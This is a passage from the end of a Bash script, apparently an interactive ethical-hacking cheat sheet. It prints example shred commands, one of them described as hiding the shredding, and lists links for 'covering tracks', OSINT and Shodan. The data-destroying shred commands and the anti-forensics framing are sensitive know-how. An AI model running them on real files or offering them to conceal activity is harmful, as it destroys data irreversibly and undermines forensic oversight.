             echo -e "2. shred -n 5 file.txt ${GREEN}# Overwrite file.txt 5 times${REST}"
             echo -e "3. shred -z file.txt ${GREEN}# Add a final overwrite with zeros to hide shredding${REST}"
             echo -e "${bold}you can combine the Three previous cmds with one cmd ${REST}"
             echo -e "4. shred -v file.txt ${GREEN}# Verbose output showing progress${REST}"
             echo -e "5. shred -f file.txt ${GREEN}# Change permissions to allow writing if necessary${REST}"

             echo -e "${bold}${YELLOW}• Reference:${REST}"
             echo -e "${GREEN}https://youtu.be/HbE_56GFPfY?si=1Apk4WyY68gjcYbW ${REST}"
             echo -e "${GREEN}https://www.freecodecamp.org/news/securely-erasing-a-disk-and-file-using-linux-command-shred/ ${REST}"
             echo -e "${YELLOW}===================================================================${REST}\n"
;;
            4) break  ;;
            *)
                echo "Invalid choice, please select a number between 1 and 6."
                ;;
      esac
       echo -e "\nPress Enter to continue..."
        read 
   done

}

########6 Phase.#########

More_References (){
while true ; do
clear
  echo -e "${bold}${YELLOW}• Reference:${REST}"
             echo -e "${GREEN}https://github.com/owerdogan/whoami-project/blob/master/LICENSE ${REST}Perfect tool for Covering Tracks"
             echo -e "${GREEN}https://book.hacktricks.xyz/ ${REST}a comprehensive wiki where you’ll find a wealth of hacking tricks, techniques, and knowledge"
             echo -e  "${GREEN}https://osintframework.com/${REST} perfect for info gathering"
             echo -e  "${GREEN}https://inteltechniques.com/index.html${REST} perfect for info gathering"
             echo -e  "${GREEN}https://www.w3schools.io/terminal/bash-tutorials/${REST} Useful for Being EH"
             echo -e  "${GREEN}https://coveryourtracks.eff.org/${REST} Test your browser to see how well you are protected from tracking and fingerprinting"
             echo -e  "${GREEN}https://youtu.be/3FNYvj2U0HM?si=N-LM4VbxERWSErlk${REST} Start Learning Pen Test and EH"
             echo -e  "${GREEN}https://youtu.be/OU-A2EmVrKQ?si=MoszTZsaCkMPGYJZ${REST} Start Learning WireShark"
             echo -e  "${GREEN}https://www.shodan.io/${REST} A Massive Passive info gathring Search Engine "
             echo -e "${YELLOW}===================================================================${REST}\n"


echo -e "${BG_CYAN} Press [Enter] to go back to the main menu.${REST}"
 read -p  "" input
    if [ -z "$input" ]; then
     main_menu
      break
    fi

done

}

main_menu

